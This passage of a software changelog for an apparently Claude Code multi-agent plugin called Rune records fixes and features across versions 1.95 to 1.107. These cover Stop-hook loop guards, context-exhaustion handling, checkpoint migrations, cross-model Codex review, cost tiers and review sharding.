- **GUARD 10 blind spot fix (F-07)** — Extended GUARD 10 with `else` branch for compact interlude turns where no `in_progress` plan exists (and thus `started_at` is unavailable). Falls back to `_check_context_critical()` bridge file check. Prevents one wasted iteration during compact interlude context exhaustion.
- **Compact interlude staleness recovery (F-02)** — If `compact_pending=true` but state file hasn't been modified in >5 minutes, the compact interlude stalled (Phase A fired but Phase B never completed). All 3 Stop hooks now reset `compact_pending` to `false` to prevent infinite Phase A/B ping-pong loops.
- **Compact interlude write verification (F-05)** — After Phase A sets `compact_pending: true` via `sed`, all 3 Stop hooks now verify the write succeeded via `grep`. Prevents infinite Phase A loops from empty file production by sed.
- **GUARD 10 abort refactoring** — Extracted `_abort_batch()`, `_abort_issues_batch()`, `_pause_hierarchy()` helper functions in each Stop hook to share abort logic between elapsed-time and context-critical checks. Reduces duplication and ensures consistent abort behavior.
- **Flag file cleanup (F-19)** — `on-session-stop.sh` now cleans up `rune-postcomp-*` flag files created by `advise-post-completion.sh`. Previously these accumulated in `/tmp` indefinitely.

## [1.107.3] - 2026-02-26

### Fixed
- **GUARD 10: Rapid iteration detection** — All 3 Stop hook loop drivers (`arc-batch-stop-hook.sh`, `arc-issues-stop-hook.sh`, `arc-hierarchy-stop-hook.sh`) now detect when an arc iteration completes in under 90 seconds, indicating the arc pipeline never actually started (context exhaustion after compaction). Instead of cascading phantom failures through remaining plans, the batch is aborted immediately with a `context_exhaustion_abort` diagnostic. Saves $60+ in wasted API spend when context window is exhausted mid-batch.
- **`_iso_to_epoch()` shared utility** — Cross-platform ISO-8601 to Unix epoch conversion (macOS BSD `date` + GNU `date` fallback) added to `scripts/lib/stop-hook-common.sh`. Used by GUARD 10 for elapsed time calculation. Strict format validation prevents shell injection via crafted timestamps.

## [1.107.2] - 2026-02-26

### Fixed
- **C1: 5 missing phases in checkpoint init** — Added `task_decomposition`, `test_coverage_critique`, `release_quality_check`, `bot_review_wait`, `pr_comment_resolution` to `arc-checkpoint-init.md`. These phases existed in `PHASE_ORDER` but were absent from the checkpoint schema, causing the dispatcher to skip them silently. Schema bumped to v17 with migration step in `arc-resume.md`.
- **C2: Cascade circuit breaker missing** — Added `checkpoint.codex_cascade?.cascade_warning` check as outermost guard in `arc-codex-phases.md` for both Phase 2.8 (semantic verification) and Phase 5.6 (codex gap analysis). Matches the pattern already enforced in SKILL.md.
- **C3: Raw codex exec in gap-analysis.md** — Replaced raw `codex exec` calls in STEP 3.5 (claim verification) and STEP 4 (gap analysis) with `codex-exec.sh` wrapper (SEC-009). The wrapper enforces model allowlist, timeout clamping, and error classification.
- **H2: Phase status "completed" vs "skipped"** — Skip paths in `arc-codex-phases.md` (Phases 2.8, 5.6) and `gap-analysis.md` now correctly set `status: "skipped"` instead of `"completed"` when codex doesn't actually run (unavailable, disabled, or blocked by circuit breaker).
- **H4: Resume session ownership** — Added step 2c to `arc-resume.md` that verifies `checkpoint.config_dir` and `checkpoint.owner_pid` before allowing resume. Prevents cross-session interference where two arc sessions could resume the same checkpoint.
- **M1: HEAVY_PHASES documentation** — Added clarifying comment in SKILL.md explaining that `HEAVY_PHASES` covers sub-skill-delegated phases only, not all team-spawning phases.
- **M2: Orphaned reference files** — Deleted 3 unreferenced `arc-phase-design-*.md` files (extraction, iteration, verification) that were remnants of removed design-sync arc integration.
- **M4: Undeclared CODEX_MODEL_ALLOWLIST** — Added explicit declaration of `CODEX_MODEL_ALLOWLIST` regex before its first use in `gap-analysis.md` STEP 3.5.
- **H1: Codex detection consistency** — Added explanatory comment in `arc-codex-phases.md` documenting why inline `Bash("command -v codex")` is used instead of `detectCodex()` (reference file self-containment).

## [1.107.1] - 2026-02-26

### Fixed
- **Codex arc workflow gate bug** — All Codex phases inside arc pipeline (`semantic_verification`, `codex_gap_analysis`, `plan_review`) were checking wrong workflow names (`"plan"`, `"work"`) instead of `"arc"`. This caused Codex phases to be silently skipped even when `codex.workflows` included `"arc"`. Fixed in `arc-codex-phases.md` (Phases 2.8, 5.6), `gap-analysis.md`, and `arc-phase-plan-review.md`. Canonical pattern: arc sub-phases register under `"arc"` (documented in `arc-phase-test.md`).
- **Default codex workflow fallback arrays** — Added `"arc"` to default fallback arrays in `arc-codex-phases.md` and `gap-analysis.md` so Codex works in arc even without explicit `talisman.codex.workflows` config.

## [1.107.0] - 2026-02-26

### Added
- **`/rune:codex-review` skill** — Cross-model code review that runs Claude and Codex agents in parallel on the same diff. Merges findings from both models using a cross-verification algorithm to produce a unified TOME with consensus issues flagged at higher severity. Use for critical changes where independent model validation adds confidence.
- **Cross-model cross-verification algorithm** — Findings from Claude Ashes and Codex are reconciled by matching file+line proximity and issue category. Consensus findings (reported by both models) are promoted to higher severity. Model-exclusive findings are preserved with provenance tags (`[claude-only]`, `[codex-only]`).
- **Claude + Codex parallel agents** — Claude Ashes (Forge Warden, Pattern Weaver, Ward Sentinel) and the Codex Oracle run concurrently in the same Agent Team. Codex agent uses `codex review` CLI with structured JSON output. Results are written to `tmp/reviews/{id}/` per agent, then merged by the cross-verifier.
- **`/rune:cancel-codex-review` command** — Cancel an active Codex Review workflow with graceful teammate shutdown. Follows the same retry-with-backoff and session isolation pattern as other cancel commands.
- **`codex_review` talisman config block** — New configuration section for tuning cross-model review behavior: `disabled`, `timeout`, `cross_model_bonus`, `confidence_threshold`, `max_agents`, `focus_areas`.

## [1.106.0] - 2026-02-26

### Added
- **Worker Question Relay Protocol** — Workers use `SendMessage` to relay questions to the orchestrator (Forge Revision 1). Orchestrator persists questions/answers to the signal directory at `tmp/.rune-signals/rune-work-{timestamp}/{taskId}.q{seq}.question`. For background mode, question files are also accessible via `tmp/work/{timestamp}/questions/` (worker-owned IPC path). Workers detect unanswered questions via strive polling loop (question detection added to Phase 2 monitor). Question cap: max 3 questions per worker, configured via `question_relay.max_questions_per_worker` in talisman.yml (SEC-006).
- **Graceful Timeout with Context Preservation** (`strive/references/context-preservation.md`) — Workers detect approaching timeout via injected `timeout_at` ISO timestamp (FAIL-001). On timeout: write `context.md` to `tmp/work/{timestamp}/context/{arc-id}/{task-id}.md` with atomic `mktemp+mv` write and `content_sha256` integrity field (FAIL-002). Stash partial work via `git stash` (FAIL-006). Orchestrator injects Truthbinding-wrapped context into resume worker prompts (SEC-001). Context truncated to 4000 chars (FLAW-004). Max 2 suspensions per task via `resume_count` field (FAIL-004). Suspended state tracked in task metadata (ARCH-002).
- **Non-Blocking Dispatch Mode** (`strive/references/background-dispatch.md`) — `/rune:strive --background (-bg)` dispatches workers after arc-batch Stop hook pattern (Forge Revision 3, REAL-005). Not a persistent daemon — one-shot wave dispatch via Stop hook. Dispatch state file at `tmp/.rune-dispatch-{timestamp}.json` with session isolation triple (SEC-004). Signal directory for progress detection (PERF-002). Dispatch lock enforces single active dispatch per session (PERF-005). Signal dir and lock created with `mkdir -m 700` owner-only perms (SEC-005). `--collect` flag gathers results after dispatch completes.
- **`/rune:status` skill** — Check status of background-dispatched workers. Shows task completion %, pending questions, worker health, and stale dispatch warnings (>2h). Performs stale worker detection as a side effect (PERF-003). `disable-model-invocation: true` (ARCH-003). `allowed-tools: Read, Glob, Grep, Bash, TaskList`.
- **Arc checkpoint schema v16** — Adds `suspended_tasks` array to `phases.work`: `{ task_id, context_path, reason }`. Context paths scoped to arc checkpoint id (FAIL-008). Explicit v15→v16 migration in arc-resume.md: `checkpoint.phases.work.suspended_tasks = checkpoint.phases.work.suspended_tasks ?? []` (FAIL-005). Resume logic detects suspended tasks, verifies integrity, reconciles git state before injection (FAIL-003), respects `resume_count` max 2 (FAIL-004).

### Security
- **SEC-001**: Context read-back wrapped in ANCHOR/RE-ANCHOR Truthbinding preamble in all resume injection paths
- **SEC-002**: Context path validation in resume — reject paths that don't start with `tmp/work/` or contain `..`
- **SEC-004**: Session isolation triple (`config_dir`, `owner_pid`, `session_id`) in dispatch state file; timestamp format validated before path construction
- **SEC-005**: Signal directory and lock file created with `mkdir -m 700` (owner-only permissions)
- **SEC-006**: Question cap (max 3 per worker in background mode) prevents unbounded blocking

### Changed
- `arc-checkpoint-init.md` schema updated from v15 to v16; `phases.work` now includes `suspended_tasks: []` field
- `arc-resume.md` migration chain extended to v16 (`3o` step); step `7a` documents suspended task resume protocol

## [1.105.2] - 2026-02-26

### Fixed
- **Context overflow between arc-batch/arc-issues/arc-hierarchy iterations** — Each arc iteration's 23-phase pipeline fills 80-90% of the context window. Without compaction, subsequent plans start in a nearly-full context and hit "Context limit reached" within the first few phases. Fixed by adding a two-phase compact interlude state machine via `compact_pending` field in the Stop hook state file. Phase A (after arc completes): injects a lightweight checkpoint prompt to give auto-compaction a chance to fire between turns. Phase B (after checkpoint): resets flag and injects the actual arc prompt with refreshed context.
- Affects: `scripts/arc-batch-stop-hook.sh`, `scripts/arc-issues-stop-hook.sh`, `scripts/arc-hierarchy-stop-hook.sh` (all three Stop hook loop drivers)

## [1.105.1] - 2026-02-26

### Fixed
- **Phantom "completed" status in arc-batch and arc-issues** — Stop hooks read arc checkpoint from `tmp/.arc-checkpoint.json` (a file that never existed). Arc actually writes checkpoints to `.claude/arc/${id}/checkpoint.json`. Because the file was never found, all failure detection was dead code and every plan defaulted to "completed" status regardless of actual outcome. Fixed by adding `_find_arc_checkpoint()` to `lib/stop-hook-common.sh` that locates the newest session-scoped checkpoint at the correct path.
- **Default-to-completed logic inverted** — `ARC_STATUS` now defaults to `"failed"` and is only set to `"completed"` with positive evidence (PR URL exists or ship/merge phase completed in checkpoint). Previous behavior: defaulted `"completed"` before any validation.
- **Pre-compact checkpoint arc data loss** — `pre-compact-checkpoint.sh` read the same non-existent `tmp/.arc-checkpoint.json`, causing compact recovery to lose all arc state context. Now uses inline checkpoint finder matching session ownership.
- Affects: `scripts/arc-batch-stop-hook.sh` (lines 188, 267), `scripts/arc-issues-stop-hook.sh` (line 133), `scripts/pre-compact-checkpoint.sh` (line 293), `scripts/lib/stop-hook-common.sh` (new `_find_arc_checkpoint()`)

## [1.105.0] - 2026-02-25

### Added
- 25 missing config keys to `talisman.example.yml` across 6 sections (`debug`, `work.worktree`, `work.unrestricted_shared_files`, `solution_arena` weights, `stack_awareness` override/custom_rules, `arc` timeouts/ship/gap_analysis, `echoes`, `context_monitor`, `context_weaving`)
- Comprehensive Config Key Reference table in `configuration-guide.md` covering all ~180+ talisman keys with types, defaults, and descriptions
- `debug:` section documentation in configuration-guide.md for ACH parallel debugging
- `work.worktree:` and `work.unrestricted_shared_files` documentation in configuration-guide.md
- Expanded `solution_arena` documentation (weights, convergence_threshold)
- Expanded `stack_awareness` documentation (override, custom_rules)

### Fixed
- Doc-code drift: 25 config keys referenced in skills but missing from `talisman.example.yml`
- `talisman-sections.md` section count (21→24) and missing key fields
- `configuration-guide.md` missing sections (debug, expanded solution_arena, expanded stack_awareness)
- Arc Timeouts table updated with 4 missing entries (task_decomposition, design_extraction, design_iteration, design_verification)

## [1.104.0] - 2026-02-25

### Added
- **Smart Plan Ordering for `/rune:arc-batch`** (Tier 1) — Phase 1.5 reorders plans by file overlap isolation and `version_target` to reduce merge conflicts and version collisions. Isolated plans (no shared file targets) execute first, then conflicting plans sorted by ascending version target. Memory-only reordering — no file writes until Phase 5.
- **`--no-smart-sort` flag** for `/rune:arc-batch` — preserves raw glob/queue order when smart ordering is undesirable. Independent from `--no-shard-sort` (both can be combined).
- **`arc.batch.smart_ordering.enabled`** talisman config key — kill switch for smart ordering (default: `true`).
- **`smart-ordering.md`** reference — Tier 1 algorithm documentation (skip conditions, 7-step algorithm, shard interaction, flag coexistence, Tier 1 limitations).
- **Flag coexistence table** in arc-batch SKILL.md — documents `--no-smart-sort` / `--no-shard-sort` interaction matrix.

### Changed
- Arc-batch pipeline overview now includes Phase 1.5 between Phase 1 (preflight) and Phase 2 (dry run).
- Known Limitation #2 updated to note smart ordering mitigation for version bump coordination.

### Migration
- Users relying on queue file order should pass `--no-smart-sort` when upgrading to v1.104.0.

## [1.103.0] - 2026-02-25

### Added
- **`/rune:talisman` skill** — Deep talisman.yml configuration expertise with 5 subcommands: `init` (stack-aware scaffolding from canonical template), `audit` (compare existing talisman against latest template), `update` (add missing sections), `guide` (explain configuration keys and best practices), `status` (talisman health summary). Detects project stack (Python, TypeScript, Rust, PHP, Go, Ruby, etc.) and generates customized ward commands, backend extensions, and dedup hierarchy prefixes.
- **Talisman sections reference** (`skills/talisman/references/talisman-sections.md`) — documents all 21 top-level talisman sections, critical configuration keys, stack-specific configuration patterns, 17 Codex deep integration keys, and 18 arc phase timeouts.
- **Tarnished routing for talisman** — fast-path keywords `talisman`, `config`, `setup` added to intent-patterns.md. Vietnamese keywords `cau hinh`, `thiet lap`, `tao talisman` also supported.

## [1.102.0] - 2026-02-25

### Added
- **Code Skimming Protocol** — 8 research/review/investigation agents updated with structured skimming strategy: read first 30 lines of each file for orientation before deep analysis. Agents: repo-surveyor, echo-reader, git-miner, lore-scholar, practice-seeker, api-contract-tracer, business-logic-tracer, data-layer-tracer. (Feature 1)
- **Auto-observation recording** (`scripts/on-task-observation.sh`) — New `TaskCompleted` hook that auto-appends lightweight Observations-tier echo entries to `.claude/echoes/{role}/MEMORY.md` after Rune workflow tasks complete. Uses `${TEAM_NAME}_${TASK_ID}` as dedup key; signals echo-search dirty for auto-reindex. Non-blocking. (Feature 2)
- **Glyph budget enforcement** (`scripts/enforce-glyph-budget.sh`) — New `PostToolUse:SendMessage` hook (GLYPH-BUDGET-001) that monitors teammate message word count and injects advisory context when over 300-word limit. Non-blocking advisory only. Configurable via `context_weaving.glyph_budget` in talisman. (Feature 3)
- **3-tier adaptive token degradation** in `guard-context-critical.sh` — Three response levels: Caution (40% remaining, advisory only), Warning (35%, degradation suggestions injected), Critical (25%, hard DENY). Previously single hard-block only. (Feature 4)
- **Arc phase memory handoff** — Arc phase transitions now emit structured summary templates that are persisted as Observations-tier echoes. Enables Tarnished to resume with full phase context after compaction. (Feature 5)
- **Completeness assessment scorer** in `TaskCompleted` haiku gate — Evaluates structural completeness of task output (0.0–1.0 score). All tasks use a single threshold of 0.7. The research_threshold: 0.5 talisman key is reserved for future use. Blocks premature task completion when output is insufficient. (Feature 6)

### Changed
- `guard-context-critical.sh` now has three tiers — Caution (40% remaining), Warning (35%), and Critical (25%) — replacing the previous single hard-block design. Caution and Warning are advisory; only Critical triggers DENY.
- `TaskCompleted` hook timeout increased from 10s to 15s to accommodate observation recording alongside the haiku quality gate.
- repo-surveyor "Smart Read Strategy" renamed to "Code Skimming Protocol" for consistency with other agents using the same pattern.

## [1.101.2] - 2026-02-25

### Fixed
- **P1: enforce-readonly.sh** — exit 2 (not 0) when jq missing; security gate was silently passing
- **P1: file-todos.md** — command name corrected to `rune:file-todos` namespace prefix
- **P2: echo-search/server.py** — `_in_clause()` helper replaces 4 SQL format string patterns
- **P2: image_handler.py** — restrict URL scheme to `https://` only
- **P2: hooks.json** — wire `Notification:statusline` hook for `rune-statusline.sh`
- **P2: figma_client.py** — `_int_env()` safe env parsing + `try/except` on Retry-After `float()`
- **P2: validate-strive-worker-paths.sh** — source `resolve-session-identity.sh` for `rune_pid_alive()`
- **P2: on-teammate-idle.sh** — rename `INSCRIPTION_PATH` to `SECTIONS_INSCRIPTION_PATH` (variable shadowing)
- **P2: react_generator.py** — dotted imports replaced with absolute imports
- **P2: cross-shard-sentinel.md** — tools field converted to YAML list format
- **P2: ash-guide/SKILL.md** — agent count corrected 67→89
- **P2: 9 skills** — added `disable-model-invocation: false` frontmatter
- **P3: rune-statusline.sh** — atomic `mktemp+mv` for bridge file write
- **P3: verify-team-cleanup.sh** — symlink guard + user-scoped trace log path
- **P3: session-start.sh** — strip remaining C0 control chars (`tr`) in jq fallback
- **P3: advise-post-completion.sh** — `TMPDIR`-based debounce path
- **P3: node_parser.py** — `_MAX_PARSE_DEPTH=100` recursion guard on `parse_node()` and `_has_vector_children()`
- **P3: figma_client.py** — `ResponseCache` LRU eviction with `max_entries=256`
- **P3: decomposer.py** — `TTLCache.put()` evicts expired entries before LRU eviction
- **P3: codex-exec.sh** — separate SIGABRT (134) and SIGSEGV (139) exit code classification
- **P3: enforce-team-lifecycle.sh** — check active state files before `rm -rf` cleanup
- **P3: arc-hierarchy-stop-hook.sh** — documented cycle detection via deadlock path
- **P3: 5 review agents** — added `mcpServers: echo-search`
- **P3: naming-intent-analyzer.md** — removed stale `skills:` field
- **P3: skill-testing/SKILL.md** — added `allowed-tools: Read, Glob, Grep`

### Changed
- README: corrected version badge (1.99.0→1.101.2), agent count (89→88), utility agents (12→11), skills count (33→38)

## [1.101.1] - 2026-02-25

### Fixed
- **Response completion after arc**: Added explicit "Response Completion" section to arc SKILL.md with mandatory turn-end instruction after ARC-9 sweep. Prevents infinite TeammateIdle notification loop that kept Claude Code "Vibing..." after successful arc completion (session stays open for user input)
- **ARC-9 time budget**: Consolidated shutdown_request pattern (send ALL at once + ONE sleep 15s) instead of per-phase sleep. Removed Strategy D prefix sweep from ARC-9 (delegated to on-session-stop.sh). Total ARC-9 budget reduced from 2+ minutes to 30 seconds max
- **Arc-batch summary loop guard**: Added rm verification + chmod+truncate fallback in arc-batch-stop-hook.sh. If state file removal fails, prevents infinite `decision:"block"` summary loop (Finding #1)
- **Stale loop file fallback in on-session-stop.sh**: Added 10-minute staleness check for arc-batch/arc-hierarchy/arc-issues loop state files. If loop hook crashed and file is stale, force cleanup instead of deferring indefinitely (Finding #5)
- **Compact recovery stale state injection**: session-compact-recovery.sh now cross-checks actual loop state file (`.claude/arc-*-loop.local.md`) before injecting "resume batch" context. Prevents restarting completed batch after 500k+ token compaction (Finding #8)

## [1.101.0] - 2026-02-25

### Added
- **Per-Source Todo Manifests** (`todos-{source}-manifest.json`): Each source (work/review/audit) gets its own focused manifest for minimal LLM context
  - Dependency DAG with Kahn's topological sort, Coffman-Graham wave grouping, and critical path analysis
  - Optional cross-source index (`todos-cross-index.json`) for inter-source edges and dedup
  - Dedup candidate detection with Jaro-Winkler + Jaccard scoring
  - Resolution log per source for false positives, duplicates, wont_fix decisions
  - Session metadata (workflow type, session_id, started_at) in every manifest
- **Schema v2**: 12 new frontmatter fields for resolution metadata, ownership audit, cross-source linking
  - `resolution`, `resolution_reason`, `resolved_by`, `resolved_at` — structured resolution tracking
  - `claimed_at`, `completed_by`, `completed_at` — ownership audit trail
  - `duplicate_of`, `related_todos`, `workflow_chain` — cross-source linking
  - `execution_order`, `wave` — computed ordering metadata
- **Status History**: Structured audit trail (markdown table) appended to every todo on status transitions
  - Pipe character escaping in reason text (prevents table corruption)
- **`interrupted` status**: New lifecycle state for todos abandoned when session ends, transitions back to `ready` on resume
- **Session context resolution** (6.0): Auto-detect active session for standalone `/rune:file-todos` subcommands
- **6 new subcommands**: `manifest build` (per-source + cross-source), `manifest graph` (ASCII + Mermaid, source-scoped), `manifest validate`, `resolve` (with `--undo`), `dedup`
- **Dedup detection**: Post-creation duplicate detection with 4 heuristic signals, three-phase pipeline (blocking → scoring → presentation)
- **Triage v2**: Resolution-aware triage with 6 options (approve, defer, false_positive, duplicate, out_of_scope, superseded)
- **Resume flow** (8.6): Reconstruct todo state from checkpoint, rebuild dirty manifests, re-ready interrupted todos
- **Deprecated talisman key warnings**: Migration guidance when removed keys detected in config
- 4 new talisman keys: `file_todos.manifest.*` and `file_todos.history.enabled`

### Changed
- **BREAKING: Session-scoped todos only** — removed standalone `todos/` at project root
  - All workflows create todos inside their `tmp/{workflow}/{id}/todos/` directory
  - Todos are mandatory for all workflows (removed `--todos=false` escape hatch)
  - Per-worker session logs relocated from `tmp/work/{ts}/todos/` to `tmp/work/{ts}/worker-logs/`
  - `_summary.md` relocated to `worker-logs/_summary.md`
- Schema version bump: 1 → 2 (backward-compatible, v1 todos remain valid)
- Replaced `.todo-index.json` cache with per-source `todos-{source}-manifest.json` files
- Per-source dirty signals (`{source}/.dirty`) instead of global dirty
- Updated strive, mend, appraise, audit, arc integrations for mandatory session-scoped todos
- `resolveTodosBase()` simplified: single-arg session-scoped (removed 3-tier resolution chain)
- `todo-update-phase.md` (mend) fully implemented with `mend_fixer_claim` lock and cross-write isolation
- Self-dependency detection in DAG builder (auto-removed with warning)
- Empty array guard on `criticalPath()` (prevents Math.max crash on empty Set)
- Support for >999 todos per source (4-digit `NNNN` ID format)
- `work_session` field deprecated (redundant with session-scoped directory)

### Removed
- `talisman.file_todos.dir` config key (session-scoped, no override)
- `talisman.file_todos.enabled` config key (todos are mandatory)
- `talisman.file_todos.auto_generate.work` config key (always generated)
- `--todos=false` CLI flag across all workflows
- `--todos-dir` CLI flag (arc passes output dir directly)
- `archive` subcommand (obsolete in session-scoped model — no persistent storage to archive to)

## [1.100.0] - 2026-02-25

### Added
- **Cost Tier Agent Model Selection** — Centralized `cost_tier` config in `talisman.yml` that controls which Claude model (opus/sonnet/haiku) each agent category uses when spawned. One switch, four profiles: `opus` (100% cost, maximum quality), `balanced` (default, ~35-40%), `efficient` (~20-25%), `minimal` (~15-20%)
  - **8 agent categories** — Truth-tellers (10 agents), Deep analysis (18), Standard review (31), Code workers (5), Research (5), Tracers (6), Utility (8), Testing (4). 87 agents total classified
  - **`resolveModelForAgent()` pseudo-function** — Maps agent name → category → tier → model string. Exception handling for `test-failure-analyst` (always elevated). Unknown agents fall back to tier defaults
  - **Reference file** — `references/cost-tier-mapping.md` with full tier definitions, category-to-tier model map, agent-to-category assignments, and pseudocode implementation
  - **Talisman config** — `cost_tier: balanced` (default). Added to `talisman.example.yml` with documented tier descriptions
  - **20+ spawn site updates** — All hardcoded `model: "sonnet"`, `model: "haiku"`, `model: "opus"` replaced with `resolveModelForAgent()` calls across: `orchestration-phases.md` (3), `SKILL.md` (2), `worker-prompts.md` (2), `arc-phase-test.md` (4), `arc-phase-plan-review.md` (1), `gap-analysis.md` (2), `gap-remediation.md` (1), `inspector-prompts.md` (2), `verdict-synthesis.md` (1), `verifier-prompt.md` (1), `role-patterns.md` (2), `arc-phase-design-*.md` (3)
  - **CLAUDE.md updated** — `resolveModelForAgent()` added to Core Pseudo-Functions section

### Notes
- Custom Ashes defined by users are NOT affected by `cost_tier` — they may use non-Claude models
- Codex Oracle has its own `codex.model` config path — NOT affected
- Main session model is controlled by Claude Code settings — NOT affected
- Agent frontmatter `model:` becomes the fallback when `cost_tier` is not set in talisman

## [1.99.0] - 2026-02-25

### Added
- **`frontend-design-patterns` skill** — Non-invocable knowledge skill for translating design specs into production components. 10 reference docs covering: accessibility (WCAG 2.1 AA), component reuse strategy (REUSE > EXTEND > CREATE), design system rules, design token reference (Figma-to-CSS/Tailwind mapping), layout alignment (Flexbox/Grid), responsive patterns (mobile-first), state and error handling (4 core UI states), Storybook patterns (CSF3/autodocs), visual region analysis (screenshot-to-structure), and variant mapping (Figma variants to component props). Auto-loaded by Stacks context router for frontend files.
- **`design-sync` skill** — `/rune:design-sync` orchestration skill for Figma design synchronization. 3-phase pipeline: PLAN (Figma extraction → VSM creation) → WORK (VSM-guided implementation) → REVIEW (fidelity scoring). Supports `--plan-only`, `--resume-work`, `--review-only` flags. Visual Spec Map (VSM) v1.0 intermediate format. 6-dimension fidelity scoring (tokens, layout, responsive, a11y, variants, states). 8 reference docs. Gated by `design_sync.enabled` in talisman.
- **`design-implementation-reviewer` agent** — Review Ash for design-to-code fidelity (FIDE prefix). Scores token compliance, layout fidelity, responsive coverage, accessibility, variant completeness, and state coverage. Activated when `design_sync.enabled` AND frontend detected AND Figma URL present.
- **`design-sync-agent` agent** — Work agent for Figma extraction and VSM creation. Uses Figma MCP tools (figma_fetch_design, figma_inspect_node, figma_list_components) to extract tokens, region trees, and variant maps. Model: sonnet, maxTurns: 40.
- **`design-iterator` agent** — Work agent for iterative design refinement. Runs screenshot-analyze-improve loop with ONE change per iteration (ITER-001 Iron Law). Convergence detection and oscillation prevention. Model: sonnet, maxTurns: 50.
- **3 arc phase reference files** — `arc-phase-design-extraction.md` (Phase 3), `arc-phase-design-verification.md` (Phase 5.2), `arc-phase-design-iteration.md` (Phase 7.6). All conditional on `design_sync.enabled`. ATE-1 compliant with session isolation.
- **Stack registry design entries** — Updated `stack-registry.md`, `detection.md`, and `context-router.md` with design tool detection (Figma URL patterns, design token files), frontend-design-patterns skill routing, and design-implementation-reviewer agent activation.
- **Talisman `design_sync` config block** — 10 configuration keys for design sync workflow (enabled, max workers, iteration limits, fidelity threshold, token snap distance).

## [1.98.0] - 2026-02-25

### Added
- **Inscription Sharding** — MapReduce-style file distribution for large-diff review (`scope=diff`, `depth=standard`)
  - **Shard Allocator** (`references/shard-allocator.md`) — Domain-affinity bin-packing algorithm that partitions `classifiedFiles` into non-overlapping shards (security_critical → backend → frontend → infra → config → tests → docs priority). Includes rebalancing step to prevent mega-shards when merging to MAX_SHARDS.
  - **Shard Reviewer Prompt Template** (`references/ash-prompts/shard-reviewer.md`) — Universal reviewer covering all 4 dimensions (Security, Quality, Documentation, Correctness) per shard. Dimensional Minimum self-check rule prevents quality-dimension clustering. `buildShardReviewerPrompt()` contract with domain-adaptive emphasis sections.
  - **Cross-Shard Sentinel** (`agents/review/cross-shard-sentinel.md`) — Metadata-only reviewer that reads only shard summary JSONs (never source code). 6 checks: import dependencies, pattern consistency, coverage blind spots, duplicate logic, security boundaries, test-source coverage. All findings default `confidence="LOW"`.
  - **SKILL.md integration** — Phase 1 Inscription Sharding Decision block (decision matrix, shard allocation, inscription.json extension). Phase 3 Sharded Review Path (parallel shard spawning, Step 2.5 output validation with stub summary generation, sequential Cross-Shard Sentinel). `buildCrossShardPrompt()` contract.
  - **Inscription Schema extension** (`references/inscription-schema.md`) — New `sharding` top-level field with shard metadata, cross-shard config. Fully backward-compatible — absent/`enabled:false` leaves `teammates[]` unchanged.
  - **Dedup registry update** (`references/dedup-runes.md`) — `SH{X}-` (SHA- through SHE-) and `XSH-` prefixes registered. Position: `SEC > BACK > VEIL > DOUBT > SH{X} > DOC > QUAL > FRONT > CDX > XSH`. SHA-SHE and XSH added to reserved prefix list.
  - **Smart-selection update** (`references/smart-selection.md`) — Decision table documenting when sharding activates vs standard Ash selection vs wave scheduling.
  - **Chunk-orchestrator update** (`references/chunk-orchestrator.md`) — Sharding bypass note: sharding supersedes chunking for `scope=diff`, chunking continues for `scope=full`.
  - **Convergence-gate update** (`references/convergence-gate.md`) — Sharding bypass note: chunk convergence gate skipped when `inscription.sharding.enabled`. Arc-level convergence remains shard-topology-agnostic.
  - **Monitor-utility update** (`references/monitor-utility.md`) — Shard reviewer and Cross-Shard Sentinel polling parameters added to per-command table.
  - **Circle-registry update** (`references/circle-registry.md`) — Shard Reviewers A-E and Cross-Shard Sentinel registered. SHA- prefix collision note (SHA-256 false-match prevention via RUNE:FINDING markers).
  - **8 new talisman keys** — `shard_threshold` (15), `shard_size` (12), `max_shards` (5), `cross_shard_sentinel` (true), `shard_model_policy` (auto), `reshard_threshold` (30), plus large_diff_threshold annotation update, chunk_size annotation update
- **Backward compatibility** — Diffs below `shard_threshold` use standard review unchanged. Deep mode uses wave scheduling (unchanged). Escape hatch: `shard_threshold: 999` disables sharding

### Changed
- `review.large_diff_threshold` and `review.chunk_size` annotations updated to note sharding supersedes chunking for `scope=diff`

## [1.97.0] - 2026-02-25

### Changed
- **Mandatory file-todos** — Removed `talisman.file_todos.enabled` gate from 41 locations across 15 files. File-todos are now always generated for work (strive) and review (appraise/audit). No talisman opt-in required. Suppress per-run with `--todos=false`
- **Simplified file-todos config** — Removed `file_todos.enabled` and `file_todos.auto_generate` talisman keys. Only `file_todos.dir` (path override) and `file_todos.triage` remain configurable

### Added
- **Wave-based execution for strive** — Workers process todos in bounded waves (max 3 todos per worker per wave by default). Fresh workers spawned each wave to avoid context exhaustion. Single-wave optimization for small task sets (<9 tasks). New talisman key: `work.todos_per_worker` (default: 3)
- **Wave-based execution for mend** — Fixers process findings in bounded waves (max 5 findings per fixer per wave by default). Fresh fixers spawned each wave. P1 findings prioritized across all waves. New talisman key: `mend.todos_per_fixer` (default: 5)
- **2 new talisman keys** — `work.todos_per_worker` (default: 3) and `mend.todos_per_fixer` (default: 5) for wave capacity tuning

## [1.96.0] - 2026-02-25

### Added
- **Context Pressure Defense System** — Multi-layer protection against context limit crashes in the arc pipeline when processing large diffs (>25 new files, >3,000 lines of new code)
  - **MEND post-compaction delegation guard** (`arc-phase-mend.md`) — RE-ANCHOR block that prevents direct orchestrator mend even after auto-compaction. Phase-specific delegation hint in `session-compact-recovery.sh` for belt+suspenders protection
  - **Mend cross-file batch reading** (`mend/SKILL.md`) — Phase 5.5 cross-file operations now batch file reads with configurable `CROSS_FILE_BATCH` size (default: 4). Talisman override: `mend.cross_file_batch_size`
  - **Large-diff chunked review** (`roundtable-circle/SKILL.md`) — Standard-depth review now auto-chunks diffs >25 files into 15-file waves. Each chunk gets its own wave of Ashes. Talisman overrides: `review.large_diff_threshold`, `review.chunk_size`
  - **Inter-phase context pressure advisory** (`arc/SKILL.md`) — Delegation Contract comment block + context advisory logs before heavy phases (work, code_review, mend). No new tool calls — log-only
  - **Context monitoring bridge check** (`arc/SKILL.md`) — Arc pre-flight Phase 0 now warns when statusline bridge file is absent, enabling `guard-context-critical.sh` to detect approaching limits
  - **Talisman configuration keys** — 3 new keys with backward-compatible defaults: `mend.cross_file_batch_size` (4), `review.large_diff_threshold` (25), `review.chunk_size` (15)

### Fixed
- **Post-compaction MEND crash** — After auto-compaction, arc orchestrator lost the Phase 7 MEND delegation instruction and tried direct edits in exhausted context. The RE-ANCHOR guard + compact recovery hint prevents this regression
- **Reviewer context exhaustion on large diffs** — With 37 changed files (28 new) split across 2 reviewers, each reviewer read ~14 files (~52K tokens of content) pushing past the ~200K context limit. Chunked review distributes load across smaller waves

## [1.95.0] - 2026-02-25

### Added
